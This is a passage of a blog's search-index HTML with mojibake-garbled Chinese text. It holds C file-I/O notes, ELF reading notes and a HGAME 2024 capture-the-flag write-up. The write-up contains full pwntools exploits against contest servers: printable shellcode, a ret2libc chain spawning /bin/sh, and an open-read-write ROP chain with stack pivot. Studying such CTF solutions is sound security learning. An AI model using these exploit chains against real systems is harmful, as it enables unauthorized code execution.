â€“ O_CREATï¼ˆ0x0100ï¼‰åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¹¶æ‰“å¼€ï¼›&lt;br&gt;
â€“ O_TRUNCï¼ˆ0x0200ï¼‰æ‰“å¼€ä¸€ä¸ªå·²å­˜åœ¨çš„æ–‡ä»¶å¹¶å°†æ–‡ä»¶é•¿åº¦è®¾ç½®ä¸º0ï¼Œå…¶ä»–å±æ€§ä¿æŒï¼›&lt;br&gt;
â€“ O_EXCLï¼ˆ0x0400ï¼‰æœªä½¿ç”¨ï¼›&lt;br&gt;
â€“ O_APPENDï¼ˆ0x0800ï¼‰è¿½åŠ æ‰“å¼€æ–‡ä»¶ï¼›&lt;br&gt;
â€“ O_TEXTï¼ˆ0x4000ï¼‰æ‰“å¼€æ–‡æœ¬æ–‡ä»¶ç¿»è¯‘CR-LFæ§åˆ¶å­—ç¬¦ï¼›&lt;br&gt;
â€“ O_BINARYï¼ˆ0x8000ï¼‰æ‰“å¼€äºŒè¿›åˆ¶å­—ç¬¦ï¼Œä¸ä½œCR-LFç¿»è¯‘ï¼›&lt;/p&gt;
&lt;p&gt;modeï¼šè¯¥å‚æ•°ä»…åœ¨access=O_CREATæ–¹å¼ä¸‹ä½¿ç”¨ï¼Œå…¶å–å€¼å¦‚ä¸‹ï¼š&lt;br&gt;
â€“ S_IFMTï¼ˆ0xF000ï¼‰ï¼šæ–‡ä»¶ç±»å‹æ©ç ï¼›&lt;br&gt;
â€“ S_IFDIRï¼ˆ0x4000ï¼‰ï¼šç›®å½•ï¼›&lt;br&gt;
â€“ S_IFIFOï¼ˆ0x1000ï¼‰ï¼šFIFO ä¸“ç”¨ï¼›&lt;br&gt;
â€“ S_IFCHRï¼ˆ0x2000ï¼‰ï¼šå­—ç¬¦ä¸“ç”¨ï¼›&lt;br&gt;
â€“ S_IFBLKï¼ˆ0x3000ï¼‰ï¼šå—ä¸“ç”¨ï¼›&lt;br&gt;
â€“ S_IFREGï¼ˆ0x8000ï¼‰ï¼šåªä¸º0x0000ï¼›&lt;br&gt;
â€“ S_IREADï¼ˆ0x0100ï¼‰ï¼šå¯è¯»ï¼›&lt;br&gt;
â€“ S_IWRITEï¼ˆ0x0080ï¼‰ï¼šå¯å†™ï¼›&lt;br&gt;
â€“ S_IEXECï¼ˆ0x0040ï¼‰ï¼šå¯æ‰§è¡Œï¼›&lt;/p&gt;
&lt;h2 id=&#34;fopenå‡½æ•°&#34;&gt;fopenå‡½æ•°&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;**FILE *fopen(char *filename, char *mode);**
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‚æ•°è§£é‡Šï¼š&lt;/p&gt;
&lt;p&gt;â€“ filenameï¼šæ–‡ä»¶åç§°ã€‚&lt;/p&gt;
&lt;p&gt;â€“ modeï¼šæ‰“å¼€æ¨¡å¼ï¼š&lt;br&gt;
rï¼šåªè¯»æ–¹å¼æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ˆè¯¥æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼‰ï¼›&lt;br&gt;
r+ï¼šå¯è¯»å¯å†™æ–¹å¼æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ˆè¯¥æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼‰ï¼›&lt;br&gt;
wï¼šåªå†™æ–¹å¼æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ˆè‹¥æ–‡ä»¶å­˜åœ¨åˆ™æ–‡ä»¶é•¿åº¦æ¸…ä¸º0ï¼Œå³è¯¥æ–‡ä»¶å†…å®¹ä¼šæ¶ˆå¤±ã€‚è‹¥æ–‡ä»¶ä¸å­˜åœ¨åˆ™å»ºç«‹è¯¥æ–‡ä»¶ï¼‰ï¼›&lt;br&gt;
w+ï¼šå¯è¯»å¯å†™æ–¹å¼åˆ›å»ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ˆè‹¥æ–‡ä»¶å­˜åœ¨åˆ™æ–‡ä»¶é•¿åº¦æ¸…ä¸ºé›¶ï¼Œå³è¯¥æ–‡ä»¶å†…å®¹ä¼šæ¶ˆå¤±ã€‚è‹¥æ–‡ä»¶ä¸å­˜åœ¨åˆ™å»ºç«‹è¯¥æ–‡ä»¶ï¼‰ï¼›&lt;br&gt;
aï¼šè¿½åŠ æ–¹å¼æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ˆè‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šå»ºç«‹è¯¥æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œå†™å…¥çš„æ•°æ®ä¼šè¢«åŠ åˆ°æ–‡ä»¶å°¾ï¼Œå³æ–‡ä»¶åŸå…ˆçš„å†…å®¹ä¼šè¢«ä¿ç•™ã€‚ï¼ˆEOFç¬¦ä¿ç•™ï¼‰ï¼‰ï¼›&lt;br&gt;
a+ï¼šå¯è¯»å¯å†™è¿½åŠ æ–¹å¼æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ˆè‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šå»ºç«‹è¯¥æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œå†™å…¥çš„æ•°æ®ä¼šè¢«åŠ åˆ°æ–‡ä»¶å°¾åï¼Œå³æ–‡ä»¶åŸå…ˆçš„å†…å®¹ä¼šè¢«ä¿ç•™ã€‚ ï¼ˆåŸæ¥çš„EOFç¬¦ä¸ä¿ç•™ï¼‰ï¼‰ï¼›&lt;br&gt;
rbï¼šåªè¯»æ–¹å¼æ‰“å¼€ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆä½¿ç”¨æ³•åˆ™åŒrï¼‰ï¼›&lt;br&gt;
rb+ï¼šå¯è¯»å¯å†™æ–¹å¼æ‰“å¼€ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆä½¿ç”¨æ³•åˆ™åŒr+ï¼‰ï¼›&lt;br&gt;
wbï¼šåªå†™æ–¹å¼æ‰“å¼€ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆä½¿ç”¨æ³•åˆ™åŒwï¼‰ï¼›&lt;br&gt;
wb+ï¼šå¯è¯»å¯å†™æ–¹å¼ç”Ÿæˆä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆä½¿ç”¨æ³•åˆ™åŒw+ï¼‰ï¼›&lt;br&gt;
abï¼šè¿½åŠ æ–¹å¼æ‰“å¼€ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆä½¿ç”¨æ³•åˆ™åŒaï¼‰ï¼›&lt;br&gt;
ab+ï¼šå¯è¯»å¯å†™æ–¹å¼è¿½åŠ ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆä½¿ç”¨æ³•åˆ™åŒa+ï¼‰ï¼›&lt;br&gt;
è¿”å›å‚æ•°ï¼š æ–‡ä»¶é¡ºåˆ©æ‰“å¼€åï¼ŒæŒ‡å‘è¯¥æµçš„æ–‡ä»¶æŒ‡é’ˆå°±ä¼šè¢«è¿”å›ã€‚è‹¥æœæ–‡ä»¶æ‰“å¼€å¤±è´¥åˆ™è¿”å›NULLï¼Œå¹¶æŠŠé”™è¯¯ä»£ç å­˜åœ¨errno ä¸­ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œæ‰“å¼€æ–‡ä»¶åä¼šä½œä¸€äº›æ–‡ä»¶è¯»å–æˆ–å†™å…¥çš„åŠ¨ä½œï¼Œè‹¥æ‰“å¼€æ–‡ä»¶å¤±è´¥ï¼Œæ¥ä¸‹æ¥çš„è¯»å†™åŠ¨ä½œä¹Ÿæ— æ³•é¡ºåˆ©è¿›è¡Œï¼Œæ‰€ä»¥åœ¨fopen()åè¯·ä½œé”™è¯¯åˆ¤æ–­åŠå¤„ç†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;åŒºåˆ«&#34;&gt;åŒºåˆ«ï¼š&lt;/h3&gt;
&lt;p&gt;å‰è€…å±äºä½çº§IOï¼Œåè€…æ˜¯é«˜çº§IOã€‚ å‰è€…è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œåè€…è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆã€‚ å‰è€…æ— ç¼“å†²ï¼Œåè€…æœ‰ç¼“å†²ã€‚ å‰è€…ä¸ read, write ç­‰é…åˆä½¿ç”¨ï¼Œ åè€…ä¸ fread, fwriteç­‰é…åˆä½¿ç”¨ã€‚ åè€…æ˜¯åœ¨å‰è€…çš„åŸºç¡€ä¸Šæ‰©å……è€Œæ¥çš„ï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç”¨åè€…ã€‚&lt;/p&gt;
&lt;h2 id=&#34;writeå‡½æ•°&#34;&gt;writeå‡½æ•°&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;ssize_t write(int fd, const void *buf, size_t count);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;fdï¼šè¦æ“ä½œçš„æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡openå‡½æ•°æ‰“å¼€æ–‡ä»¶æ—¶è·å–ã€‚&lt;/p&gt;
&lt;p&gt;bufï¼šæŒ‡å®šå†™å…¥æ•°æ®å¯¹åº”çš„ç¼“å†²åŒºï¼Œå¯ä»¥å°†éœ€è¦çš„å†™å…¥çš„å†…å®¹å­˜æ”¾åˆ°bufä¸­ï¼Œå†å°†å…¶å†™å…¥æ–‡ä»¶é‡Œã€‚&lt;/p&gt;
&lt;p&gt;countï¼šæŒ‡å®šå†™å…¥çš„å­—èŠ‚æ•°ï¼Œå•ä½æ˜¯å­—èŠ‚ã€‚&lt;/p&gt;
&lt;p&gt;è¿”å›å€¼ï¼šå¦‚æœå†™æ“ä½œé¡ºåˆ©å®Œæˆï¼Œåˆ™ä¼šè¿”å›å†™å…¥çš„å­—èŠ‚æ•°ï¼›å¦‚æœè¿”å›å€¼ä¸º0ï¼Œåˆ™è¡¨ç¤ºæœªå‘æ–‡ä»¶ä¸­å†™å…¥ä»»ä½•å­—ç¬¦ï¼›å¦‚æœå†™å…¥å‡ºé”™ï¼Œåˆ™ä¼šè¿”å›-1ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¸€èˆ¬æ¥è¯´&#34;&gt;ä¸€èˆ¬æ¥è¯´&lt;/h3&gt;
&lt;p&gt;fd=1æ—¶æ ‡å‡†è¾“å‡ºï¼Œfd=æ–‡ä»¶fdæ—¶è¾“å‡ºåˆ°æ–‡ä»¶&lt;/p&gt;
&lt;h2 id=&#34;readå‡½æ•°&#34;&gt;readå‡½æ•°&lt;/h2&gt;
&lt;p&gt;Cè¯­è¨€ä¸­ï¼Œ&lt;code&gt;read&lt;/code&gt;å‡½æ•°æ˜¯ç”¨äºä»æ–‡ä»¶æè¿°ç¬¦ä¸­è¯»å–æ•°æ®çš„å‡½æ•°ï¼Œå…¶åŸå‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;unistd.h&amp;gt;
ssize_t read(int fd, void *buf, size_t count);
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;fd&lt;/code&gt;ï¼šæ–‡ä»¶æè¿°ç¬¦ï¼ŒæŒ‡å®šè¦è¯»å–çš„æ–‡ä»¶æˆ–å¥—æ¥å­—çš„æ ‡è¯†ç¬¦ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;buf&lt;/code&gt;ï¼šæŒ‡å‘å­˜å‚¨è¯»å–æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;count&lt;/code&gt;ï¼šè¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;read&lt;/code&gt;å‡½æ•°çš„è¿”å›å€¼æ˜¯å®é™…è¯»å–çš„å­—èŠ‚æ•°ã€‚å¦‚æœè¿”å›å€¼ä¸º0ï¼Œè¡¨ç¤ºå·²åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼›å¦‚æœè¿”å›å€¼ä¸º-1ï¼Œè¡¨ç¤ºè¯»å–å‡ºé”™ã€‚&lt;/p&gt;
&lt;p&gt;éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ&lt;code&gt;read&lt;/code&gt;å‡½æ•°æ˜¯ä¸€ä¸ªé˜»å¡å‡½æ•°ï¼Œå½“æ²¡æœ‰æ•°æ®å¯è¯»æ—¶ï¼Œå®ƒä¼šä¸€ç›´ç­‰å¾…ç›´åˆ°æœ‰æ•°æ®å¯è¯»æˆ–å‡ºç°é”™è¯¯ã€‚å¦‚æœéœ€è¦*éé˜»å¡è¯»å–æ•°æ®**ï¼Œå¯ä»¥ä½¿ç”¨&lt;code&gt;select&lt;/code&gt;æˆ–&lt;code&gt;poll&lt;/code&gt;ç­‰å‡½æ•°è¿›è¡Œæ“ä½œã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¸€èˆ¬æ¥è¯´-2&#34;&gt;ä¸€èˆ¬æ¥è¯´&lt;/h3&gt;
&lt;p&gt;fd=0æ—¶æ ‡å‡†è¾“å…¥ï¼Œfd=æ–‡ä»¶fdæ—¶è¯»å–æ–‡ä»¶&lt;/p&gt;
&lt;h3 id=&#34;fdæè¿°ç¬¦&#34;&gt;fdæè¿°ç¬¦&lt;/h3&gt;
&lt;p&gt;0ï¼Œ1ï¼Œ2 è¿™ä¸‰ä¸ª fd å€¼å·²ç»è¢«èµ‹äºˆç‰¹æ®Šå«ä¹‰ï¼Œåˆ†åˆ«æ˜¯æ ‡å‡†è¾“å…¥ï¼ˆ STDIN_FILENO ï¼‰ï¼Œæ ‡å‡†è¾“å‡ºï¼ˆ STDOUT_FILENO ï¼‰ï¼Œæ ‡å‡†é”™è¯¯ï¼ˆ STDERR_FILENO ï¼‰&lt;/p&gt;
">æ¢libcæºï¼Œä¸€äº›shellcodeæ¨¡æ¿ï¼Œorw</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/hgame-2024week-1bu-fen-wp/"" data-c="
          &lt;h1 id=&#34;ezshellcode&#34;&gt;ezshellcode&lt;/h1&gt;
&lt;p&gt;æŸ¥çœ‹æ–‡ä»¶é€»è¾‘ï¼Œå‘ç°mmapå‡½æ•°ï¼Œæ‰“å¼€äº†å¯æ‰§è¡Œæƒé™&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707274301403.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;v4æ˜¯æ— ç¬¦å·æ•´å‹ï¼Œåœ¨é•¿åº¦åˆ¤æ–­æ—¶å¼ºè¡Œè½¬åŒ–ä¸ºäº†intç±»å‹å’Œ10è¿›è¡Œæ¯”è¾ƒï¼Œå¯ä»¥é€šè¿‡è¾“å…¥-1ç»•è¿‡é•¿åº¦åˆ¤æ–­&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707274316891.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å‘ç°å¯¹shellcodeæœ‰å­—ç¬¦é™åˆ¶ï¼Œåœ¨ç½‘ä¸Šå¯ä»¥æ‰¾åˆ°å¯è§å­—ç¬¦shellcodeï¼Œexpå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = remote(&amp;quot;47.100.245.185&amp;quot;,30806)
#p = process(&#39;./vuln&#39;)
elf = ELF(&#39;./vuln&#39;)

p.sendline(&amp;quot;-1&amp;quot;)
pay = &amp;quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&amp;quot;
p.sendafter(&#39;input your shellcode:&#39;,pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;elden-random-challenge&#34;&gt;&lt;strong&gt;Elden Random Challenge&lt;/strong&gt;&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707274331253.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;æŸ¥çœ‹é€»è¾‘æ˜¯å¯¹æ¯”99ä¸ªä¼ªéšæœºæ•°ï¼Œéšæœºæ•°ç§å­ä¹Ÿç»™å‡ºï¼Œæ‰€ä»¥&lt;/p&gt;
&lt;p&gt;åˆ›å»ºä¸€ä¸ªcè¯­è¨€æ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;time.h&amp;gt;
void set_seed() 
{
	srand(time(0LL));
}
int random_number() 
{ Â  Â 
	return rand();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°†å…¶ç¼–è¯‘ä¸ºä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc -shared -o 1.so 1.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç»•è¿‡éšæœºæ•°åˆ¤æ–­åå°±æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œæ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;1.æ³„éœ²putså‡½æ•°å®é™…åœ°å€ï¼Œä»è€Œæ³„éœ²libcåŸºåœ°å€&lt;/p&gt;
&lt;p&gt;2.æ ¹æ®åŸºåœ°å€æ‰¾åˆ°systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²&lt;/p&gt;
&lt;p&gt;3.æ§åˆ¶ç³»ç»Ÿæ‰§è¡Œsystemå‡½æ•°&lt;/p&gt;
&lt;p&gt;expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
import ctypes

context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)

lib = ctypes.CDLL(&#39;./1.so&#39;)

p = remote(&amp;quot;47.100.245.185&amp;quot;,32620)
#p = process(&#39;./random&#39;)
elf = ELF(&#39;./random&#39;)
libc = ELF(&#39;./libc.so.6&#39;)

lib.random_number.restype = ctypes.c_int

lib.set_seed()

p.sendafter(&amp;quot;name.&amp;quot;,b&amp;quot;aaaaaaaa&amp;quot;)

i = 0
while i&amp;lt;=98:
	b = lib.random_number()  
	t = b % 100 + 1
	print(&amp;quot;t = &amp;quot;,t)              
	p.sendafter(b&#39;number:\n&#39;,p64(t))
	i += 1

puts_plt=elf.plt[&#39;puts&#39;]
puts_got=elf.got[&#39;puts&#39;]
main_addr=0x40125D
pop_rdi_ret=0x401423
ret=0x40101a

payload = b&#39;a&#39;*56+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendafter(&amp;quot;mind.\n&amp;quot;,payload)

puts_addr=u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

#libc_base = puts_addr - libc.symbols[&#39;puts&#39;]
#system_addr = libc_base + libc.symbols[&#39;system&#39;]
#bin_addr = libc_base + next(libc.search(b&#39;/bin/sh&#39;))

libc_base = puts_addr - 0x084420
system_addr = libc_base + 0x052290
bin_addr = libc_base + 0x1B45BD

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;sys = &amp;quot;,hex(system_addr))
print(&amp;quot;bin = &amp;quot;,hex(bin_addr))

#gdb.attach(p)
payload=b&#39;b&#39;*56+p64(ret)+p64(pop_rdi_ret)+p64(bin_addr)+p64(system_addr)
p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;elden-ring-i&#34;&gt;&lt;strong&gt;Elden Ring â… &lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;èµ·åˆï¼Œä»¥ä¸ºåªæ˜¯ä¸€ä¸ªç®€ç®€å•å•çš„ret2libcï¼Œæ³„éœ²putså®é™…åœ°å€ç„¶åç›´æ¥è°ƒç”¨systemå‡½æ•°å–å¾—shellï¼Œä½†æ˜¯ä¸€é¡¿æ“ä½œååŠ¨æ€è°ƒè¯•å‘ç°è¿›å…¥systemå‡½æ•°äº†ï¼Œä½†æ˜¯äº§ç”Ÿäº†SIGSYSä¿¡å·ï¼Œæ²¡æœ‰æˆåŠŸå–å¾—shellï¼Œå½“æ—¶è§‰å¾—éå¸¸ç„å­¦ï¼Œç»å­¦ä¹ ï¼Œå‘ç°å¯ä»¥é€šè¿‡seccompå·¥å…·æŸ¥çœ‹å‡½æ•°æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼Œå‘ç°execveå‡½æ•°è¢«ç¦ç”¨ï¼ˆæ¨‚ï¼‰ï¼Œå¹¶ä¸”æ ˆæº¢å‡ºé•¿åº¦æœ‰ç‚¹çŸ­ï¼Œæ‰€ä»¥æ ˆè¿ç§»æ‰“orw&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707274350884.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;æ¯”èµ›æœŸé—´å†™çš„expæœ¬åœ°èƒ½è¾“å‡ºç¼–å†™çš„flagï¼Œä½†æ˜¯è¿œç«¯å´ä¸€ç›´æ‰“ä¸é€šï¼ˆåˆä¸€ç„å­¦é—®é¢˜ï¼‰ï¼Œç»“æŸåçœ‹äº†wpï¼Œå‘ç°wpä¸­çš„å‡½æ•°åç§»è¿˜æœ‰libcæ–‡ä»¶ä¸­çš„Gadgetsåç§»éƒ½å’Œæˆ‘çš„ä¸ä¸€æ ·ï¼ŒæŸ¥çœ‹åå‘ç°é™„ä»¶ä¸­çš„libcæ–‡ä»¶å„ä¸ªåç§»éƒ½å’Œwpä¸€æ ·ï¼Œç¨‹åºé“¾æ¥çš„æ˜¯å…ˆå‰å®‰è£…çš„libc.so.6æ–‡ä»¶ï¼ˆéš¾å´©ï¼‰ï¼Œæ”¹ä¸‹åç§»æˆåŠŸæ‰“é€š&lt;/p&gt;
&lt;p&gt;expå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

io = remote(&amp;quot;106.15.72.34&amp;quot;,31549)
#io = process(&#39;./vuln&#39;)
elf = ELF(&#39;./vuln&#39;)

puts_plt=elf.plt[&#39;puts&#39;]
puts_got=elf.got[&#39;puts&#39;]
main_addr=0x401292
pop_rdi_ret=0x4013e3
ret=0x40101a
vuln = 0x40125B

payload = b&#39;a&#39;*0x108+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
io.sendafter(&amp;quot;accord.\n\n&amp;quot;,payload)

puts_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

#libc_base = puts_addr - libc.sym[&#39;puts&#39;]

libc_base = puts_addr - 0x084420
print(&amp;quot;base = &amp;quot;,hex(libc_base))

rdi = 0x4013e3
rsi = libc_base + 0x2601f
rdx = libc_base + 0x119211
rsp = libc_base + 0x2f70a

read_real=libc_base+0x10DFC0

open_real=libc_base+0x10DCE0

write_real=libc_base+0x10E060

bss_addr = 0x404090
pop_rax_ret = 0x36174 + libc_base
#gdb.attach(io)

### read_bss
bss_base=0x404090

# read(int fd, void *buf, size_t count);
fd=0
buf=bss_base+0x100
count=0x200

payload=b&#39;a&#39;*0x108+p64(rsi)+p64(buf)+p64(read_real)+p64(rsp)+p64(buf+8)
io.send(payload)
 
### rop-&amp;gt;bss
payload=b&#39;./flag&#39;.ljust(8,b&#39;\x00&#39;)

# open(const char *pathname, int flags)
pathname_ptr=buf
flags=0
payload+=p64(rdi)+p64(pathname_ptr)+p64(rsi)+p64(flags)+p64(open_real)


# read(int fd, void *buf, size_t count);
fd=3
buf2=buf+0x300
count=0x100
payload+=p64(rdi)+p64(fd)+p64(rsi)+p64(buf2)+p64(rdx)+p64(count)+p64(0)+p64(read_real)


# write(int handle,void* buf,int length)
handle=1
buf3=buf2
length=0x50
payload+=p64(rdi)+p64(1)+p64(rsi)+p64(buf3)+p64(rdx)+p64(length)+p64(0)+p64(write_real)+p64(vuln)

io.sendafter(&amp;quot;accord.\n\n&amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
"> hgame 2024(week 1)éƒ¨åˆ†wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/han-jia-xue-xi/"" data-c="
          &lt;h1 id=&#34;ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»é˜…è¯»ç¬”è®°ä¸€&#34;&gt;ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»é˜…è¯»ç¬”è®°(ä¸€)&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;gcc -E 1.c -o 1.i         //-Eè¡¨ç¤ºåªè¿›è¡Œé¢„ç¼–è¯‘ï¼Œ-o=-output
gcc -S 1.c -o 1.s         //ç¼–è¯‘
gcc -c 1.s -o 1.o         //æ±‡ç¼–
gcc -c 1.c                //-cè¡¨ç¤ºåªç¼–è¯‘ä¸é“¾æ¥
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;elfæ–‡ä»¶å¼€å¤´çš„åå…­ä¸ªå­—èŠ‚é­”æ•°&#34;&gt;ELFæ–‡ä»¶å¼€å¤´çš„åå…­ä¸ªå­—èŠ‚(é­”æ•°)&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;7f(DEL) 45(&#39;E&#39;) 4c(&#39;L&#39;) 46(&#39;F&#39;) 02(ELFæ–‡ä»¶ç±»å‹) 01(å­—èŠ‚åº) 01(ELFæ–‡ä»¶ç‰ˆæœ¬å·) 00 00 00 00 00 00 00 00 00

ELFæ–‡ä»¶ç±»å‹ï¼š0x1:32ä½   0x2:64ä½

å­—èŠ‚åºï¼š0x1:å°ç«¯åº    0x2:å¤§ç«¯åº

ELFç‰ˆæœ¬å·ï¼šä¸€èˆ¬éƒ½æ˜¯0x1
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;elfä¸­çš„æ®µ&#34;&gt;ELFä¸­çš„æ®µ&lt;/h2&gt;
&lt;h3 id=&#34;data&#34;&gt;.data&lt;/h3&gt;
&lt;p&gt;å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡&lt;/p&gt;
&lt;h3 id=&#34;bss&#34;&gt;.bss&lt;/h3&gt;
&lt;p&gt;æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡&lt;/p&gt;
&lt;h3 id=&#34;common&#34;&gt;COMMON&lt;/h3&gt;
&lt;p&gt;æœªåˆå§‹åŒ–çš„é™æ€å˜é‡å’Œåˆå§‹åŒ–ä¸º0çš„å…¨å±€å˜é‡æˆ–é™æ€å˜é‡ï¼ˆåªæ˜¯ä¸ºæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡é¢„ç•™ä½ç½®ï¼Œæ‰€ä»¥åœ¨æ–‡ä»¶ä¸­ä¸å æ®ç©ºé—´ï¼‰&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1706330239149.png&#34; alt=&#34;1706330239149&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;é™æ€åº“&#34;&gt;é™æ€åº“&lt;/h2&gt;
&lt;h3 id=&#34;é™æ€åº“çš„æ„é€ &#34;&gt;é™æ€åº“çš„æ„é€ &lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;gcc -c 1.c 2.c                //åªç¼–è¯‘è¿™ä¸¤ä¸ªæ–‡ä»¶
ar ecs libvector.a 1.o 2.o    //å°†è¿™ä¸¤ä¸ªæ–‡ä»¶é“¾æ¥åˆ°libvector.açš„é™æ€åº“ä¸­
ae -t libvector.a             //æŸ¥çœ‹é“¾æ¥åº“å­˜åœ¨çš„æˆå‘˜
&lt;/code&gt;&lt;/pre&gt;
